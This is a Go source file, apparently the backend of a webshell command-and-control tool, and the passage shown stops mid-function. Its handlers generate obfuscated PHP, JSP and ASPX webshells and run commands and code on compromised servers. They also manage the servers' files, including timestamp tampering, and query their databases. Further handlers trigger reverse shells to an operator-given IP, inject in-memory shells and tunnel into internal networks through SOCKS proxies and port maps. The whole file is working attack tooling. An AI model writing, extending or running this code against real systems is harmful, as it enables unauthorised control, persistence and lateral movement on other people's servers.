package webshell

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"strings"
)

func newID() string {
	b := make([]byte, 12)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// genCode 无需 shell id，按参数直接生成 Shell 代码（用于独立代码生成器）。
func (m *Module) genCode(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	shellType := q.Get("type")
	if shellType == "" {
		shellType = "php"
	}
	password := q.Get("password")
	if password == "" {
		password = "aegis"
	}
	protocol := q.Get("protocol")
	if protocol == "" {
		protocol = "default_aes"
	}
	obfuscate := q.Get("obfuscate") == "1" || q.Get("obfuscate") == "true"
	var code string
	if obfuscate {
		code = ShellCodeObfuscated(shellType, password, protocol)
	} else {
		code = ShellCode(shellType, password, protocol)
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"code":        code,
		"shellType":   shellType,
		"protocol":    protocol,
		"key":         deriveKey(password),
		"description": protocolDesc(shellType, protocol),
		"obfuscated":  obfuscate,
	})
}

// ─── 列表 / 添加 ──────────────────────────────────────────────────────────────

func (m *Module) listShells(w http.ResponseWriter, _ *http.Request) {
	if m.store == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "存储未就绪"})
		return
	}
	shells, err := m.store.list()
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"shells": shells})
}

func (m *Module) addShell(w http.ResponseWriter, r *http.Request) {
	if m.store == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "存储未就绪"})
		return
	}
	var req struct {
		URL           string `json:"url"`
		ShellType     string `json:"shellType"`
		Protocol      string `json:"protocol"`
		CustomHeaders string `json:"customHeaders"`
		Password      string `json:"password"`
		Note          string `json:"note"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "请求解析失败: " + err.Error()})
		return
	}
	if req.URL == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "URL 不能为空"})
		return
	}
	if req.ShellType == "" {
		req.ShellType = "php"
	}
	if req.Protocol == "" {
		req.Protocol = "default_aes"
	}
	if req.Password == "" {
		req.Password = "aegis"
	}
	sh := &shellRecord{
		ID:            newID(),
		URL:           req.URL,
		ShellType:     req.ShellType,
		Protocol:      req.Protocol,
		CustomHeaders: req.CustomHeaders,
		Password:      req.Password,
		Note:          req.Note,
	}
	if err := m.store.add(sh); err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"id": sh.ID})
}

// ─── 路径解析 ──────────────────────────────────────────────────────────────────

const shellsBase = "/api/m/webshell/shells/"

// parseShellPath 从请求 URL 中提取 id 和后续 action 部分。
func parseShellPath(r *http.Request) (id, action string) {
	rest := strings.TrimPrefix(r.URL.Path, shellsBase)
	idx := strings.IndexByte(rest, '/')
	if idx < 0 {
		return rest, ""
	}
	return rest[:idx], rest[idx+1:]
}

// ─── GET 操作 ─────────────────────────────────────────────────────────────────

func (m *Module) shellGetOps(w http.ResponseWriter, r *http.Request) {
	id, action := parseShellPath(r)
	if id == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 shell id"})
		return
	}
	switch action {
	case "code":
		m.getShellCode(w, r, id)
	case "socks/status":
		m.socksStatus(w, r, id)
	case "portmap/status":
		m.portMapStatus(w, r, id)
	default:
		m.getShellInfo(w, r, id)
	}
}

// ─── PUT 操作 ─────────────────────────────────────────────────────────────────

func (m *Module) shellPutOps(w http.ResponseWriter, r *http.Request) {
	id, _ := parseShellPath(r)
	if id == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 shell id"})
		return
	}
	if m.store == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "存储未就绪"})
		return
	}
	var req struct {
		Note string `json:"note"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "请求解析失败"})
		return
	}
	if err := m.store.updateNote(id, req.Note); err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── POST 操作 ────────────────────────────────────────────────────────────────

func (m *Module) shellPostOps(w http.ResponseWriter, r *http.Request) {
	id, action := parseShellPath(r)
	if id == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 shell id"})
		return
	}
	switch {
	case action == "connect":
		m.connectShell(w, r, id)
	case action == "exec":
		m.execCmd(w, r, id)
	case action == "eval":
		m.evalCode(w, r, id)
	case action == "files/list":
		m.filesListDir(w, r, id)
	case action == "files/read":
		m.filesReadFile(w, r, id)
	case action == "files/write":
		m.filesWriteFile(w, r, id)
	case action == "files/upload":
		m.filesUpload(w, r, id)
	case action == "files/delete":
		m.filesDeletePath(w, r, id)
	case action == "files/rename":
		m.filesRename(w, r, id)
	case action == "files/mkdir":
		m.filesMkDir(w, r, id)
	case action == "files/download":
		m.filesDownload(w, r, id)
	case action == "files/hash":
		m.filesHash(w, r, id)
	case action == "realcmd/create":
		m.realCMDCreate(w, r, id)
	case action == "realcmd/read":
		m.realCMDRead(w, r, id)
	case action == "realcmd/write":
		m.realCMDWrite(w, r, id)
	case action == "realcmd/stop":
		m.realCMDStop(w, r, id)
	case action == "db/query":
		m.dbQuery(w, r, id)
	case action == "connectback":
		m.connectBack(w, r, id)
	case action == "socks/start":
		m.socksStart(w, r, id)
	case action == "socks/stop":
		m.socksStop(w, r, id)
	case action == "portmap/start":
		m.portMapStart(w, r, id)
	case action == "portmap/stop":
		m.portMapStop(w, r, id)
	case action == "memshell":
		m.memShell(w, r, id)
	case action == "plugin":
		m.pluginExec(w, r, id)
	case action == "plugin/submit":
		m.pluginSubmit(w, r, id)
	case action == "plugin/result":
		m.pluginResult(w, r, id)
	case action == "plugin/stop":
		m.pluginStop(w, r, id)
	case action == "files/append":
		m.filesAppend(w, r, id)
	case action == "files/timestamp":
		m.filesGetTimestamp(w, r, id)
	case action == "files/timestamp/update":
		m.filesUpdateTimestamp(w, r, id)
	case action == "files/createfile":
		m.filesCreateFile(w, r, id)
	case action == "files/checkexist":
		m.filesCheckExist(w, r, id)
	case action == "files/downloadpart":
		m.filesDownloadPart(w, r, id)
	case action == "files/uploadchunk":
		m.filesUploadChunk(w, r, id)
	case action == "socks/clear":
		m.socksClear(w, r, id)
	case action == "transfer/http":
		m.transferHTTP(w, r, id)
	case action == "transfer/tcp":
		m.transferTCP(w, r, id)
	case action == "bshell/listen":
		m.bshellListen(w, r, id)
	case action == "bshell/list":
		m.bshellList(w, r, id)
	case action == "bshell/read":
		m.bshellRead(w, r, id)
	case action == "bshell/write":
		m.bshellWrite(w, r, id)
	case action == "bshell/stop":
		m.bshellStop(w, r, id)
	case action == "revportmap/create":
		m.revPortMapCreate(w, r, id)
	case action == "revportmap/list":
		m.revPortMapList(w, r, id)
	case action == "revportmap/read":
		m.revPortMapRead(w, r, id)
	case action == "revportmap/write":
		m.revPortMapWrite(w, r, id)
	case action == "revportmap/stop":
		m.revPortMapStop(w, r, id)
	case action == "remotesocks/start":
		m.remoteSocksStart(w, r, id)
	case action == "remotesocks/stop":
		m.remoteSocksStop(w, r, id)
	default:
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "未知操作: " + action})
	}
}

// ─── DELETE 操作 ──────────────────────────────────────────────────────────────

func (m *Module) shellDeleteOps(w http.ResponseWriter, r *http.Request) {
	id, _ := parseShellPath(r)
	if id == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 shell id"})
		return
	}
	if m.store == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "存储未就绪"})
		return
	}
	if err := m.store.delete(id); err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	m.evictAgent(id)
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── 辅助：加载 shell 记录 ─────────────────────────────────────────────────────

func (m *Module) loadShell(w http.ResponseWriter, id string) (*shellRecord, bool) {
	if m.store == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "存储未就绪"})
		return nil, false
	}
	sh, err := m.store.get(id)
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "shell 不存在"})
		return nil, false
	}
	return sh, true
}

// ─── Shell 基础信息 ───────────────────────────────────────────────────────────

func (m *Module) getShellInfo(w http.ResponseWriter, _ *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	sh.Password = ""
	writeJSON(w, http.StatusOK, sh)
}

func (m *Module) getShellCode(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	shellType := r.URL.Query().Get("type")
	if shellType == "" {
		shellType = sh.ShellType
	}
	protocol := sh.Protocol
	if protocol == "" {
		protocol = "default_aes"
	}
	obfuscate := r.URL.Query().Get("obfuscate") == "1"
	var code string
	if obfuscate {
		code = ShellCodeObfuscated(shellType, sh.Password, protocol)
	} else {
		code = ShellCode(shellType, sh.Password, protocol)
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"code":       code,
		"shellType":  shellType,
		"protocol":   protocol,
		"key":        deriveKey(sh.Password),
		"obfuscated": obfuscate,
	})
}

// ─── 连接 Shell ───────────────────────────────────────────────────────────────

func (m *Module) connectShell(w http.ResponseWriter, _ *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	agent := m.getAgent(sh)
	info, err := agent.GetInfo()
	if err != nil {
		_ = m.store.updateStatus(id, "offline")
		writeJSON(w, http.StatusOK, map[string]any{"status": "offline", "error": err.Error()})
		return
	}
	_ = m.store.updateInfo(id, info, "online")
	writeJSON(w, http.StatusOK, map[string]any{"status": "online", "info": info})
}

// ─── 命令执行 ─────────────────────────────────────────────────────────────────

func (m *Module) execCmd(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Cmd string `json:"cmd"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Cmd == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 cmd 参数"})
		return
	}
	output, err := m.getAgent(sh).Exec(req.Cmd)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error(), "output": ""})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "output": output})
}

// ─── 代码执行 ─────────────────────────────────────────────────────────────────

func (m *Module) evalCode(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Code string `json:"code"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Code == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 code 参数"})
		return
	}
	output, err := m.getAgent(sh).Eval(req.Code)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error(), "output": ""})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "output": output})
}

// ─── 虚拟终端 (RealCMD) ───────────────────────────────────────────────────────

func (m *Module) realCMDCreate(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Shell string `json:"shell"` // 终端路径，如 /bin/bash 或 cmd.exe
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "请求解析失败"})
		return
	}
	if req.Shell == "" {
		req.Shell = "/bin/bash"
	}
	if err := m.getAgent(sh).RealCMDCreate(req.Shell); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) realCMDRead(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	output, err := m.getAgent(sh).RealCMDRead()
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "output": output})
}

func (m *Module) realCMDWrite(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Cmd string `json:"cmd"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "请求解析失败"})
		return
	}
	if err := m.getAgent(sh).RealCMDWrite(req.Cmd); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) realCMDStop(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	if err := m.getAgent(sh).RealCMDStop(); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── 数据库管理 ───────────────────────────────────────────────────────────────

func (m *Module) dbQuery(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Type     string `json:"type"`
		Host     string `json:"host"`
		Port     string `json:"port"`
		User     string `json:"user"`
		Pass     string `json:"pass"`
		Database string `json:"database"`
		SQL      string `json:"sql"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "请求解析失败"})
		return
	}
	if req.SQL == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "SQL 不能为空"})
		return
	}
	var result *DBResult
	var err error
	a := m.getAgent(sh)
	if sh.ShellType == "jsp" || sh.ShellType == "aspx" || sh.ShellType == "python" {
		result, err = a.jspDBQuery(req.Type, req.Host, req.Port, req.User, req.Pass, req.Database, req.SQL)
	} else {
		result, err = a.DBQuery(req.Type, req.Host, req.Port, req.User, req.Pass, req.Database, req.SQL)
	}
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "headers": result.Headers, "rows": result.Rows})
}

// ─── 反弹 Shell ───────────────────────────────────────────────────────────────

func (m *Module) connectBack(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Type string `json:"type"` // shell 或 meter
		IP   string `json:"ip"`
		Port string `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.IP == "" || req.Port == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 ip/port 参数"})
		return
	}
	if req.Type == "" {
		req.Type = "shell"
	}
	if err := m.getAgent(sh).ConnectBack(req.Type, req.IP, req.Port); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── SOCKS5 代理 ──────────────────────────────────────────────────────────────

func (m *Module) socksStart(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		LocalPort int `json:"localPort"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.LocalPort <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 localPort 参数"})
		return
	}
	sp := m.proxies.get(sh.ID)
	sp.mu.Lock()
	defer sp.mu.Unlock()
	if sp.socks == nil {
		sp.socks = newSocksServer(m.getAgent(sh))
	}
	if err := sp.socks.Start(req.LocalPort); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "localPort": req.LocalPort})
}

func (m *Module) socksStop(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	sp := m.proxies.get(sh.ID)
	sp.mu.Lock()
	if sp.socks != nil {
		sp.socks.Stop()
	}
	sp.mu.Unlock()
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) socksStatus(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	sp := m.proxies.get(sh.ID)
	sp.mu.Lock()
	var st socksStatus
	if sp.socks != nil {
		st = sp.socks.Status()
	}
	sp.mu.Unlock()
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "status": st})
}

// ─── 端口映射 ─────────────────────────────────────────────────────────────────

func (m *Module) portMapStart(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		LocalPort  int    `json:"localPort"`
		TargetHost string `json:"targetHost"`
		TargetPort string `json:"targetPort"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.LocalPort <= 0 || req.TargetHost == "" || req.TargetPort == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 localPort/targetHost/targetPort 参数"})
		return
	}
	sp := m.proxies.get(sh.ID)
	sp.mu.Lock()
	defer sp.mu.Unlock()
	if sp.portmap == nil {
		sp.portmap = newPortMapServer(m.getAgent(sh))
	}
	if err := sp.portmap.Start(req.LocalPort, req.TargetHost, req.TargetPort); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) portMapStop(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	sp := m.proxies.get(sh.ID)
	sp.mu.Lock()
	if sp.portmap != nil {
		sp.portmap.Stop()
	}
	sp.mu.Unlock()
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) portMapStatus(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	sp := m.proxies.get(sh.ID)
	sp.mu.Lock()
	var st portMapStatus
	if sp.portmap != nil {
		st = sp.portmap.Status()
	}
	sp.mu.Unlock()
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "status": st})
}

// ─── 内存马 ───────────────────────────────────────────────────────────────────

func (m *Module) memShell(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Action    string `json:"action"`    // generate | inject
		ShellType string `json:"shellType"` // shutdown | filter | session
		Path      string `json:"path"`      // 注入时写入的目标路径
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "请求解析失败"})
		return
	}
	// 根据 shell 类型选择内存马类别
	if req.ShellType == "" {
		switch sh.ShellType {
		case "jsp":
			req.ShellType = "filter"
		case "aspx":
			req.ShellType = "handler"
		default:
			req.ShellType = "shutdown"
		}
	}
	var code string
	var ext string
	switch sh.ShellType {
	case "jsp":
		code = MemShellJSP(req.ShellType, sh.Password)
		ext = ".jsp"
	case "aspx":
		code = MemShellASPX(req.ShellType, sh.Password)
		ext = ".aspx"
	default:
		code = MemShellPHP(req.ShellType, sh.Password)
		ext = ".php"
	}
	isJava := sh.ShellType == "jsp" || sh.ShellType == "aspx"
	if req.Action == "generate" {
		writeJSON(w, http.StatusOK, map[string]any{
			"ok":   true,
			"code": code,
			"ext":  ext,
			"lang": map[bool]string{true: "java", false: "php"}[isJava],
		})
		return
	}
	// inject：写入目标路径
	if req.Path == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "注入需要提供 path 参数"})
		return
	}
	if err := m.getAgent(sh).WriteFile(req.Path, []byte(code)); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "path": req.Path, "ext": ext})
}

// ─── SOCKS 清理 ───────────────────────────────────────────────────────────────

func (m *Module) socksClear(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	if err := m.getAgent(sh).SocksClear(); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── 异步插件 ─────────────────────────────────────────────────────────────────

func (m *Module) pluginSubmit(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		TaskID string `json:"taskId"`
		Code   string `json:"code"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Code == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少参数"})
		return
	}
	if req.TaskID == "" {
		req.TaskID = newID()
	}
	if err := m.getAgent(sh).PluginSubmit(req.TaskID, req.Code); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "taskId": req.TaskID})
}

func (m *Module) pluginResult(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		TaskID string `json:"taskId"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.TaskID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 taskId 参数"})
		return
	}
	running, result, err := m.getAgent(sh).PluginGetResult(req.TaskID)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "running": running, "result": result})
}

func (m *Module) pluginStop(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		TaskID string `json:"taskId"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.TaskID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 taskId 参数"})
		return
	}
	if err := m.getAgent(sh).PluginStop(req.TaskID); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── Transfer 内网穿透 ────────────────────────────────────────────────────────

func (m *Module) transferHTTP(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Method  string `json:"method"`
		URL     string `json:"url"`
		Headers string `json:"headers"`
		Body    string `json:"body"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.URL == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 url 参数"})
		return
	}
	if req.Method == "" {
		req.Method = "GET"
	}
	resp, err := m.getAgent(sh).TransferHTTP(req.Method, req.URL, req.Headers, req.Body)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "response": resp})
}

func (m *Module) transferTCP(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Host    string `json:"host"`
		Port    string `json:"port"`
		Payload string `json:"payload"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Host == "" || req.Port == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 host/port 参数"})
		return
	}
	resp, err := m.getAgent(sh).TransferTCPForward(req.Host, req.Port, req.Payload)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "response": resp})
}

// ─── BShell 管理 ──────────────────────────────────────────────────────────────

func (m *Module) bshellListen(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Port int `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Port <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 port 参数"})
		return
	}
	if err := m.getAgent(sh).BShellListen(req.Port); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) bshellList(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	list, err := m.getAgent(sh).BShellList()
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "sessions": list})
}

func (m *Module) bshellRead(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		AddrPort string `json:"addrPort"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.AddrPort == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 addrPort 参数"})
		return
	}
	data, err := m.getAgent(sh).BShellRead(req.AddrPort)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "data": base64.StdEncoding.EncodeToString(data)})
}

func (m *Module) bshellWrite(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		AddrPort string `json:"addrPort"`
		Data     string `json:"data"` // base64
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.AddrPort == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少参数"})
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		data = []byte(req.Data)
	}
	if err := m.getAgent(sh).BShellWrite(req.AddrPort, data); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) bshellStop(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Port int `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Port <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 port 参数"})
		return
	}
	if err := m.getAgent(sh).BShellStop(req.Port); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── ReversePortMap ───────────────────────────────────────────────────────────

func (m *Module) revPortMapCreate(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Port int `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Port <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 port 参数"})
		return
	}
	if err := m.getAgent(sh).ReversePortMapCreate(req.Port); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) revPortMapList(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	list, err := m.getAgent(sh).ReversePortMapList()
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "sessions": list})
}

func (m *Module) revPortMapRead(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		SessionKey string `json:"sessionKey"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionKey == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 sessionKey 参数"})
		return
	}
	data, err := m.getAgent(sh).ReversePortMapRead(req.SessionKey)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "data": base64.StdEncoding.EncodeToString(data)})
}

func (m *Module) revPortMapWrite(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		SessionKey string `json:"sessionKey"`
		Data       string `json:"data"` // base64
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionKey == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少参数"})
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		data = []byte(req.Data)
	}
	if err := m.getAgent(sh).ReversePortMapWrite(req.SessionKey, data); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) revPortMapStop(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Port int `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Port <= 0 {
